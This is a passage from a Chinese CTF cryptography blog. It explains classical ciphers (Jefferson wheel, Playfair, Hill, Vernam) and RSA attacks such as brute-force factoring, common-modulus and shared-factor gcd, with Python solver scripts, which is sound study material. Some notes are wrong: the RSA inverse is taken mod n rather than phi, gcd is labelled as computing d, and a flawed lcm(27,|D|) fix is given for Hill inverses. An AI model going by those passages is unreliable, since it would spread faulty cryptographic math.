IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&#x27;&#x27;&#x27;steady_content=re.findall(r&#x27;&lt;(.*?)&lt;&#x27;,steady_str)steady_vi=[2,3,7,5,13,12,9,1,8,10,4,11,6]steady_m=&quot;NFQKSEVOQOFNP&quot;steady_new_content=[]steady_new_content2=[None for k in range(13)]steady_vi2=[]for i in range(len(steady_vi)): steady_move=steady_vi[i] steady_new_content.append(steady_content[steady_move-1])for j in range(len(steady_new_content)): steady_vi2.append(steady_new_content[j].index(steady_m[j]))for x,y in enumerate(steady_new_content): steady_new_content2[x]=re.sub(r&quot; &quot;,&quot;&quot;,y[steady_vi2[x]:]+y[:steady_vi2[x]])for i in range(26): steady_flag=&quot;&quot; for j in range(13): steady_flag+=steady_new_content2[j][i] print(steady_flag) 123456789101112131415161718192021222324252627282930mtable = &quot;&quot;&quot;1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;&quot;&quot;&quot;.split(&#x27;\\n&#x27;)m = [&quot;&quot;] * 13for i in range(13): for y in mtable[i]: if str.isalpha(y): m[i] += ykey = [2, 3, 7, 5, 13, 12, 9, 1, 8, 10, 4, 11, 6]message = &quot;NFQKSEVOQOFNP&quot;for i in range(len(key)): x = key[i] - 1 # key[i] - 1 while m[x][0] != message[i]: m[x] = m[x][1:] + m[x][0]for i in range(26): for j in range(len(key)): print(m[key[j] - 1][i].lower(), end=&quot;&quot;) print(&quot;\\n&quot;) Playfair密钥生成 选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将I和J视作同一字。） 数据加密 将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。最后不足两位也补X或者Q。 1、若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。 2、若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。 3、若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。 数据解密 1、若c1 c2在同一行，对应明文p1 p2分别是紧靠c1 c2 左端的字母。其中最后一列被看做是第一列的左方。 2、若c1 c2在同一列，对应明文p1 p2分别是紧靠c1 c2 上方的字母。其中最后一行被看做是第一行的上方。 3、若c1 c2不在同一行，不在同一列，则p1 p2是由c1 c2确定的矩形的其他两角的字母。 比如： 密钥crazy dog 123456789p l a y fi r b c de g h j km n o q st u v w x 明文：where there is life,there is hope. 分组：wh er et he re is li fe th er ei sh op e 加密：KU YO XD OL OY PL FK DL FU YO LG LN NG LY 解密：where there is life,there is hope python解密 123from pycipher import Playfaira&#x3D;Playfair(&#39;密文&#39;).decipher(&#39;密钥&#39;)print(a) 123from pycipher import Playfaira&#x3D;Playfair(&#39;CULTREABDFGHIKMNOPQSVWXYZ&#39;).decipher(&#39;CGOCPMOFEBMLUNISEOZY&#39;)print(a) 密钥：playfair。密文：Dncnoqqfliqrpgeklwmppu 123from pycipher import Playfaira&#x3D;Playfair(&#39;playfirbcdeghkmnoqstuvwxz&#39;).decipher(&#39;Dncnoqqfliqrpgeklwmppu&#39;)print(a) 密钥：shiyanb 密文：KQSAMFPAOPMFPA 123from pycipher import Playfaira&#x3D;Playfair(&#39;shiyanbcdefgjklmopqrtuvwx&#39;).decipher(&#39;KQSAMFPAOPMFPA&#39;)print(a) 我们在密钥生成的时候遵循将I和J视作同一字的原则，所以如果密钥中出现i或者j，就不能出现i或者j。第一个题我们是i和j都不出现，第二个题我们只出现了j，所以有些题还是要视情况而定。 希尔密码原理： 希尔密码是运用基本矩阵论原理的替换密码。每个字母当作26进制数字：A=0，B=1…一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD 26。注意用作加密的矩阵（即密钥）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。 例如：设分组长度n=2，密钥为：K={7,9；8,3}，明文为：friday 加密过程为： （1）将明文分为两两一组（因为n=2）：fr,id,ay （2）将明文字母转换为对应的明文编码：（5,17），（8,3），（0,24） （3）分别计算每一组明文对应的密文编码： 123（5,17）*K mod 26 &#x3D;（15,16）（8,3） *K mod 26&#x3D;（2,5）（0,24） *K mod 26&#x3D;（10,20） （4）将密文编码转换为对应的密文字母，即pq，cf，ku 解密过程为： （1）将密文分为两两一组：pq，cf，ku （2）将密文字母转换为对应的编码：（15,16），（2,5），（10,20） （3）分别计算每一组密文对应的明文编码（K-1位K的逆矩阵） 123（15,16）*K-1 mod 26 &#x3D;（5,17）（2,5） *K -1mod 26&#x3D;（8,3）（10,20） *K-1 mod 26&#x3D;（0,24） （4）将明文编码转换为明文字母，完成解密。 前提： 1231、密文2、矩阵（也叫解密矩阵） 步骤： 12345671、根据矩阵，求出逆矩阵。2、逆矩阵与密文对应的矩阵相乘。（一定要注意写密文矩阵的顺序）3、得到矩阵b,每一个数与26相余。4.得到的余数转ascii 例子： 密文：dloguszijluswogany 矩阵： 1231 20 1 求逆矩阵 12345678from numpy import *a3&#x3D;mat([[1,2],[0,1]])print(a3)a4&#x3D;a3.Iprint(a4)[[ 1. -2.] [ 0. 1.]] 密文转化 12d l o g u s z i j l u s w o g a n y4 12 15 7 21 19 26 9 10 12 21 19 23 15 7 1 14 25 逆矩阵与密文矩阵相乘 12345from numpy import *a=mat([[1,-2],[0,1]])b=mat([[4,15,21,26,10,21,23,7,14],[12,7,19,9,12,19,15,1,25]])c=a*bprint(c) 矩阵mod26 拿到flag 求最小公倍数 12345678910def bei(num1,num2): b = [] for i in range(1,(num1 * num2)+1): if i % num1 == 0 and i % num2 == 0: b.append(i) break return b[0]num1=int(input())num2=int(input())print(bei(num1, num2)) 如果逆矩阵得到了分数。出现分数项则 *最小公倍数(27,|D|) |D|为行列式的值。 求行列式的值 1234567891011121314151617181920212223242526272829303132333435363738def MatrixGetDet(M): length = len(M) if length == 2: return M[0][0]*M[1][1] - M[0][1]*M[1][0] import itertools # sum positive positive = 0 indexer1 = itertools.cycle(range(length)) indexer2 = itertools.cycle(range(length)) for index in range(length): indexer1.next() _tmp = 1 for index in range(length): index1 = indexer1.next() index2 = indexer2.next() _tmp *= M[index1][index2] positive += _tmp # sum negative negative = 0 indexer1 = itertools.cycle(range(length)) indexer2 = itertools.cycle(range(length)[::-1]) for index in range(length): indexer1.next() _tmp = 1 for index in range(length): index1 = indexer1.next() index2 = indexer2.next() _tmp *= M[index1][index2] negative += _tmp # return return positive - negativematrix1 = [ [1, 2, 3], [4, 5, 6], [7, 8, 10],]print MatrixGetDet(matrix1) 最终脚本 123456789101112from numpy import *dis=&#123;1:&#x27;a&#x27;,2:&#x27;b&#x27;,3:&#x27;c&#x27;,4:&#x27;d&#x27;,5:&#x27;e&#x27;,6:&#x27;f&#x27;,7:&#x27;g&#x27;,8:&#x27;h&#x27;,9:&#x27;i&#x27;,10:&#x27;j&#x27;,11:&#x27;k&#x27;,12:&#x27;l&#x27;,13:&#x27;m&#x27;,14:&#x27;n&#x27;,15:&#x27;o&#x27;,16:&#x27;p&#x27;,17:&#x27;q&#x27;,18:&#x27;r&#x27;,19:&#x27;s&#x27;,20:&#x27;t&#x27;,21:&#x27;u&#x27;,22:&#x27;v&#x27;,23:&#x27;w&#x27;,24:&#x27;x&#x27;,25:&#x27;y&#x27;,26:&#x27;z&#x27;&#125;f=mat([[8,16,27],[8,99,24],[27,24,27]])e=mat([[22,9,0],[12,3,1],[10,3,4],[8,1,17]])g=e*fflag=&quot;&quot;for i in range(4): for j in range(3): k=(g[i][j])%26+1 l=dis[k] flag+=lprint(flag) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120from numpy import *from optparse import OptionParserdef Start(): opt = OptionParser() opt.add_option(&#x27;-k&#x27;,dest=&#x27;key&#x27;,help=&quot;Input your matrix&quot;) opt.add_option(&#x27;-p&#x27;,dest=&#x27;pw&#x27;,help=&quot;Input your passwd&quot;) options,args = opt.parse_args() if options.pw is None or options.key is None: print &#x27;Use \\&#x27;-h\\&#x27; to get help&#x27; exit(0) return optionsdef ForKey(key): key = mat(key) key = key.I.T print &#x27;key is :&#x27; print key print &#x27;------------------------------------------&#x27; return keydef ForPw(pw,lenght): result = [[] for i in range(len(pw)/lenght)] for i in range(len(pw)/lenght): string = pw[i*lenght:(i+1)*lenght] for s in string: if s.isalpha(): s = ord(s) - 96 result[i].append(s) result = mat(result) print &#x27;password matrix is:&#x27; print result print &#x27;------------------------------------------&#x27; return resultdef Deal(start): key = start.key pw = start.pw if pw.isalpha(): judge = True key = ForKey(key) result = ForPw(pw,len(key)) return key,result,judgedef Exploit(key,result,judge): get = result * key print &#x27;The result matrix is:&#x27; print get print &#x27;------------------------------------------&#x27; get = array(get) string = &#x27;&#x27; for n in get: for i in n: one = int(i) while one &lt; 0: one = one + 26 one = one + 96 string = string + chr(one) print &#x27;The final result is:\\n&#x27; + stringdef main(): start = Start() key,result,judge = Deal(start) Exploit(key,result,judge)if __name__ == &#x27;__main__&#x27;: main() 总结： 1.在转换逆矩阵的时候，如果出现了分数或者小数。我们需要将逆矩阵乘以27和d(给我们的矩阵的行列式)的最小公倍数。 2.加密矩阵如果是 2 × 2 的方阵，明文就要每两个为列，组成 2 × n 的矩阵。 德军密码([费娜姆密码])12345678910111213141516171819202122232425262728293031323334353637383940414243444546EnCODE &#x3D;&#123;&#39;A&#39;:&#39;1000001&#39; ,&#39;N&#39;:&#39;1001110&#39;, &#39;B&#39;: &#39;1000010&#39;, &#39;O&#39; :&#39;1001111&#39;, &#39;C&#39;: &#39;1000011&#39;, &#39;P&#39; :&#39;1010000&#39;, &#39;D&#39;: &#39;1000100&#39;, &#39;Q&#39; :&#39;1010001&#39;, &#39;E&#39;: &#39;1000101&#39;, &#39;R&#39; :&#39;1010010&#39;, &#39;F&#39;: &#39;1000110&#39;, &#39;S&#39; :&#39;1010011&#39;, &#39;G&#39;: &#39;1000111&#39;, &#39;T&#39; :&#39;1010100&#39;, &#39;H&#39;: &#39;1001000&#39;, &#39;U&#39; :&#39;1010101&#39;, &#39;I&#39;: &#39;1001001&#39;, &#39;V&#39; :&#39;1010110&#39;, &#39;J&#39;: &#39;1001010&#39;, &#39;W&#39; :&#39;1010111&#39;, &#39;K&#39;: &#39;1001011&#39; ,&#39;X&#39; :&#39;1011000&#39;, &#39;L&#39;: &#39;1001100&#39; ,&#39;Y&#39; :&#39;1011001&#39;, &#39;M&#39;: &#39;1001101&#39; ,&#39;Z&#39; :&#39;1011010&#39;&#125;DeCODE&#x3D;&#123; &#39;1000001&#39;:&#39;A&#39;, &#39;1001110&#39;:&#39;N&#39;, &#39;1000010&#39;:&#39;B&#39;, &#39;1001111&#39;:&#39;O&#39;, &#39;1000011&#39;:&#39;C&#39;, &#39;1010000&#39;:&#39;P&#39;, &#39;1000100&#39;:&#39;D&#39;, &#39;1010001&#39;:&#39;Q&#39;, &#39;1000101&#39;:&#39;E&#39;, &#39;1010010&#39;:&#39;R&#39;, &#39;1000110&#39;:&#39;F&#39;, &#39;1010011&#39;:&#39;S&#39;, &#39;1000111&#39;:&#39;G&#39;, &#39;1010100&#39;:&#39;T&#39;, &#39;1001000&#39;:&#39;H&#39;, &#39;1010101&#39;:&#39;U&#39;, &#39;1001001&#39;:&#39;I&#39;, &#39;1010110&#39;:&#39;V&#39;, &#39;1001010&#39;:&#39;J&#39;, &#39;1010111&#39;:&#39;W&#39;, &#39;1001011&#39;:&#39;K&#39;, &#39;1011000&#39;:&#39;X&#39;, &#39;1001100&#39;:&#39;L&#39;, &#39;1011001&#39;:&#39;Y&#39;, &#39;1001101&#39;:&#39;M&#39;, &#39;1011010&#39;:&#39;Z&#39;&#125;steady_str&#x3D;&quot;00000100001000001101000001100001010&quot;steady_key&#x3D;&quot;large&quot;.upper()steady_new_key&#x3D;&quot;&quot;flag&#x3D;&quot;&quot;for i in steady_key: steady_new_key+&#x3D;EnCODE[i]for j in range(0,len(steady_str),7): inting&#x3D;&quot;&quot; string&#x3D;str(steady_str[j:j+7]) string1&#x3D;str(steady_new_key[j:j+7]) for z in range(7): inting+&#x3D;str(int(string[z])^int(string1[z])) try: flag+&#x3D;DeCODE[inting] except: passprint(flag) 123456789101112131415161718192021#费纳姆密码解密脚本cipher &#x3D; input(&quot;请输入密文：&quot;)key &#x3D; input(&quot;请输入密钥：&quot;)miyao &#x3D; &quot;&quot;flag1 &#x3D; &quot;&quot;final &#x3D; &quot;&quot;for i in key: miyao +&#x3D; (str(bin(ord(i)))[2:])print(miyao)for i in range(len(cipher)): flag1 +&#x3D; str(int(cipher[i])^int(miyao[i]))#flag七个一组进行分割print(cipher)step &#x3D; 7b &#x3D; [flag1[i:i+step] for i in range(0,len(flag1),step)]flag &#x3D; []for i in b: flag.append(i)for i in flag: final +&#x3D; chr(int(i,2))print(&quot;flag为：&quot;+final)","categories":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/categories/CTF-%E5%AF%86%E7%A0%81/"}],"tags":[{"name":"CTF-密码","slug":"CTF-密码","permalink":"http://s1eady.top/tags/CTF-%E5%AF%86%E7%A0%81/"}]},{"title":"CTF-RSA","slug":"CTF-RSA","date":"2018-11-07T19:28:56.000Z","updated":"2020-10-16T11:43:16.863Z","comments":true,"path":"2018/11/08/CTF-RSA/","link":"","permalink":"http://s1eady.top/2018/11/08/CTF-RSA/","excerpt":"","text":"CTF-RSA基础什么是”素数”不能表示为其它任何两个整数的乘积(除了1或者本身)，比如13只能是13*1=13，3*5=15，15就不是质数。 什么是”互质数”公约数只有1的两个数，叫做互质数。 模运算110 mod 3&#x3D;1；26 mod 6&#x3D;2；28 mod 2 &#x3D;0 欧拉函数什么是欧拉函数欧拉函数是小于x的整数中与x互素的数的个数，一般用φ(x)表示。特殊的，φ(1)=1。 如何计算欧拉函数通式：φ(n)=n*(1-1/p1)*(1-1/p2)*(1-1/p3)*(1-1/p4)*…*(1-1/pn),其中p1, p2……pn为n的所有素因数，n是不为0的整数。 欧拉定理欧拉定理是指：如果两个正整数a和n互素，则n的欧拉函数φ(n)可以让下面的式子成立： 即a的φ(n)次方减去1，可以被n整除. 比如，3和4互质，φ(4)=2，(3^2-1)/4=2. 当a为正整数，n为素数且a不能被n整除时，则有a^(n-1) ≡ 1 (mod n)这就是费马小定理. RSA加密算法密钥的生成过程12341. 随意选择两个大的素数p和q，p不等于q，计算n &#x3D; pq.2. 根据欧拉函数的性质3，求得r&#x3D;φ(n)&#x3D;φ(p)φ(q)&#x3D;(p-1)(q-1).3. 选择一个小于r的整数e,且e与r互素；并求得e关于r的模反元素，命名为d.(模反元素存在，当且仅当e与r互质; 求d令ed≡1(mod r)）4. 将p和q的记录销毁 (n，e)是公钥，(n，d)是私钥. 例如： 1234561. A随机选两个不相等的质数61和53，并计算两数的积n&#x3D;61*53&#x3D;3233，n的长度就是密钥长度。3233的二进制是110010100001，一共12位， 所以这个密钥就是12位. 实际应用中，RSA密钥一般是1024位，重要的场合是2048位.2. 计算n的欧拉函数; φ(n)&#x3D;(p-1)(q-1)&#x3D;60*52&#x3D;3120.3. A在1到3120上随机选择了一个随机数e&#x3D;17，与3120互素.4. 计算e对φ(n)的模反元素d，即时，ed-1&#x3D;kφ(n)。 即使求解：17x+3120y&#x3D;1.用扩展欧几里得算法求解。可以算出一组解(x,y)&#x3D;(2753,-15)，即d&#x3D;2753. 公钥(3233, 17)，私钥(3233,2753) 加解密过程明文：m 密文：c 两个数：p、qn：q×pf(n)：(p-1)×(q-1)e：与f(n)互为质数d：e×d=1 mod f(n) 加密公钥加密—-(n,e)—-(33,3) 1c&#x3D;m^e%N 解密1m&#x3D;c^d%N 总结12345选择两个大素数p和q，计算出模数N &#x3D; p * q计算φ &#x3D; (p−1) * (q−1) 即N的欧拉函数，然后选择一个e (1&lt;e&lt;φ)，且e和φ互质取e的模反数为d，计算方法: e * d ≡ 1 (mod φ)对明文m进行加密：c &#x3D; pow(m, e, N)，得到的c即为密文对密文c进行解密，m &#x3D; pow(c, d, N)，得到的m即为明文 Python与RSA求p、q 123N&#x3D;30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511q&#x3D;57970027print(N&#x2F;&#x2F;q) 分解N 1234N &#x3D; 920139713for i in range(2, N): if N % i &#x3D;&#x3D; 0: print (i) 1234567python2from factordb.factordb import FactorDBN=322831561921859factor=FactorDB(N)factor.connect()factor_list=factor.get_factor_list()print(factor_list) 求解D 1D &#x3D; gmpy2.invert(e,n) # 求逆元，de &#x3D; 1 mod n 返回的D的类型为&lt;class ‘mpz’&gt; 欧几里得算法求D 1D&#x3D;gmpy2.gcd(a,b) 求明文 1m&#x3D;pow(int(c),d,n) 其中d的类型是&lt;class ‘mpz’&gt; 初始化一个大整数x 1gmpy2.mpz(x) libnum库 libnum.s2n(s)：字符串转换为数字 12345import libnums &#x3D; &quot;ab12&quot;print(libnum.s2n(s))result: 1633825074 libnum.s2n(n)：数字转换为字符串 12345import libnumn &#x3D; 1633825074print(libnum.n2s(n))result: ab12 libnum.s2b(s)：字符串转换为二进制字符串 12345import libnums &#x3D; &quot;ab12&quot;print(libnum.s2b(s))result: 01100001011000100011000100110010 libnum.b2s(b)：二进制字符串转换为字符串 12345import libnumb &#x3D; &quot;01100001011000100011000100110010&quot;print(libnum.b2s(b))result: ab12 求d 1234567import gmpy2 p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phi = (p-1)*(q-1) d = gmpy2.invert(e,phi) print d 1234567import libnum p = 3487583947589437589237958723892346254777 q = 8767867843568934765983476584376578389 e = 65537 phi = (p-1)*(q-1) d = libnum.invmod(e,phi) print d CTF-中的RSA总体思路就是获取秘文然后根据给的条件解密。 爆破因子模数N过小时，我们可以写个脚本直接爆破他的因子 1234N &#x3D; 920139713for i in range(2, N): if N % i &#x3D;&#x3D; 0: print (i) 12345678910111213import gmpy2flag=&quot;&quot;e=19q=18443p=49891n=920139713phin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)f=open(&#x27;/Users/apple/Desktop/1.txt&#x27;,&#x27;r&#x27;)for i in f.readlines(): m=pow(int(i),d,n) flag+=chr(m)print(flag) 求N、P、Q前提： 题目给出了p+q,(p+1)(q+1),e,d,c。 12345678910(p+1)(q+1)=p*q+p+q+1=n+(p+q)+1=xn=x-(p+q+1)y=(q+p+1)n=x-yphi=(p-1)(q-1) =p*q-p-q+1 =p*q-(p+q)+1 =n-y+2d = gmpy2.invert(e,phi)m = pow(c,d,n) 1234567891011import gmpy2 from Crypto.Util.number import long_to_bytes x = 0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea + 1 y = 0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740 c = 0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a e = 0xe6b1bee47bd63f615c7d0a43c529d219 n = y-x phi = n-x+2 d =gmpy2.invert(e,phi) m = pow(c,d,n) print long_to_bytes(m) 公共模数攻击前提： 共模、知道公钥、未知D、gcd(e1,e2)==1 判断gcd(e1,e2)==1 123456789def gcd(a,b): if a%b == 0: return b else : return gcd(b,a%b)e1=11187289e2=9647291if gcd(e1,e2)==1: print(9) 12345678910111213141516from gmpy2 import *import libnumn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929e1 = 17e2 = 65537s = gcdext(e1, e2)s1 = s[1]s2 = -s[2]c1 = libnum.s2n(open(&quot;./veryhardRSA/flag.enc1&quot;, &#x27;rb&#x27;).read())c2 = libnum.s2n(open(&quot;./veryhardRSA/flag.enc2&quot;, &#x27;rb&#x27;).read())c2 = invert(c2, n)m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % nprint libnum.n2s(m) 12345678910111213141516from gmpy2 import *import libnumn = 15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571e1 = 797e2 = 521s = gcdext(e1, e2)s1 = s[1]s2 = -s[2]c1 = 11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930c2 = 6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849c2 = invert(c2, n)m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % nprint libnum.n2s(m) 共同公约数前提： 如果在两次公钥的加密过程中使用的n1和n2具有相同的素因子，那么可以利用欧几里得算法直接将p和q分解。 123456789import gmpy2n1=9051013965404084482870087864821455535159008696042953021965631089095795348830954383127323853272528967729311045179605407693592665683311660581204886571146327720288455874927281128121117323579691204792399913106627543274457036172455814805715668293705603675386878220947722186914112990452722174363713630297685159669328951520891938403452797650685849523658191947411429068829734053745180460758604283051344339641429819373112365211739216160420494167071996438506850526168389386850499796102003625404245645796271690310748804327n2=13225948396179603816062046418717214792668512413625091569997524364243995991961018894150059207824093837420451375240550310050209398964506318518991620142575926623780411532257230701985821629425722030608722035570690474171259238153947095310303522831971664666067542649034461621725656234869005501293423975184701929729170077280251436216167293058560030089006140224375425679571181787206982712477261432579537981278055755344573767076951793312062480275004564657590263719816033564139497109942073701755011873153205366238585665743flag=gmpy2.gcd(n1,n2)print(flag) 十六进制与十进制转换十进制 1234567891011121314import gmpy2import binasciiimport mathflag=&quot;&quot;n=30064958471180141352963255964320727764941087854957385562672821662319854021395100968823341108075020928542437446993994119863902565874355296188498304761389336438421889636409561936141985786801002923752627293790265351723795968412774268086467114263767947693310444934316205390814185802517514694528501333851255084653925181726978734804806707740444755908398751964899143494522781405457103697373868972836201511424363601490903086488506985489526910314474245106338585623571369549388434865567951986866445306840505397268281889886738015891982162371413136885989746931929787765617838750381226036784122498143172854419447324975505933540511p=518629368090170828331048663550229634444384299751272939077168648935075604180676006392464524953128293842996441022771890719731811852948684950388211907532651941639114462313594608747413310447500790775078081191686616804987790818396104388332734677935684723647108960882771460341293023764117182393730838418468480006985768382115446225422781116531906323045161803441960506496275763429558238732127362521949515590606221409745127192859630468854653290302491063292735496286233738504010613373838035073995140744724948933839238851600638652315655508861728439180988253324943039367876070687033249730660337593825389358874152757864093q=57970027e=65537c=7794723418575865133221710844957533763600341922604517613342495747603012554180094280541823023634873599126585279853308940496678282266476710442981516354722804125430496779901585048718048185233664790252394684332465074382441230073678600882729934579182285214951880877250418707254283530428901115269852700826395665491878667661628136001999399484533201783253765516767750014674954245926135408324886326143714299876277011335423927566142213389260930015587242338816401180184690143281167398845157288962617745058933037815909282349958256327539704772842249498887000705177364153517572284141825022022854893024073953342334031407154501829377phin = (p - 1) * (q - 1)d=gmpy2.invert(e, phin)m=hex(int(pow(int(c),d,n)))flag=binascii.a2b_hex(m[2:-1])print(flag) 十六进制 123456import math#python2N=0xee290c7a603fc23300eb3f0e5868d056b7deb1af33b5112a6da1edc9612c5eeb4ab07d838a3b4397d8e6b6844065d98543a977ed40ccd8f57ac5bc2daee2dec301aac508f9befc27fae4a2665e82f13b1ddd17d3a0c85740bed8d53eeda665a5fc1bed35fbbcedd4279d04aa747ac1f996f724b14f0228366aeae34305152e1f430221f9594497686c9f49021d833144962c2a53dbb47bdbfd19785ad8da6e7b59be24d34ed201384d3b0f34267df4ba8b53f0f4481f9bd2e26c4a3e95cd1a47f806a1f16b86a9fc5e8a0756898f63f5c9144f51b401ba0dd5ad58fb0e97ebac9a41dc3fb4a378707f7210e64c131bca19bd54e39bbfa0d7a0e7c89d955b1c9fe=0x10001d=0x9186c78d098af6815622ea9901cf84a89ead578a6dbdded7d7fc63531756239dc586501216fc2e4bd1a8cee7e62284d16d91195f356d733a52dff011ebc3bf1e5d62af54d0455ea2f6ec948f45f34931f5b0b4478b16c66951a95d2f069a6c8867a6bc673c8e40052a54dbc5c1aeacbbfae7cad150a4f41ef4a02b1c97d70636ae187ed3c45f2551696a6a1172ae4089e033fb4853057c0f1e227d71ccf24fb27073ca4fe4ac3744dfed2cd7763c47ac4ae4d42820a19d68961bc103bb9016197463875169d062b45807e2e86aa17fa65e3088cc75ef35f984d0ca92d4c9270c2e694eb1f5df16b7ebe32b5c1d26086d6aac5fe327288f2904cb54164db39151c=0x3dbf00a02f924a70f44bdd69e73c46241e9f036bfa49a0c92659d8eb0fe47e42068eaf156a9b3ee81651bc0576a91ffed48610c158dc8d2fb1719c7242704f0d965f8798304925a322c121904b91e5fc5eb3dc960b03eb8635be53b995217d4c317126e0ec6e9a9acfd5d915265634a22a612de962cfaa2e0443b78bdf841ff901423ef765e3d98b38bcce114fede1f13e223b9bd8155e913c8670d8b85b1f3bcb99353053cdb4aef1bf16fa74fd81e42325209c0953a694636c0ce0a19949f343dc229b2b7d80c3c43ebe80e89cbe3a3f7c867fd7cee06943886b0718a4a3584c9d9f9a66c9de29fda7cfee30ad3db061981855555eeac01940b1924eb4c301print(hex(pow(c,d,N))[2:-1].decode(&#x27;hex&#x27;)) .pem、.pub、flag.enc公钥：通常是以.pem或.pub结尾的文件。 密文：通常叫做flag.enc之类的。 私钥：pem文件 openssl获取n和e123456789101112131415➜ ~ 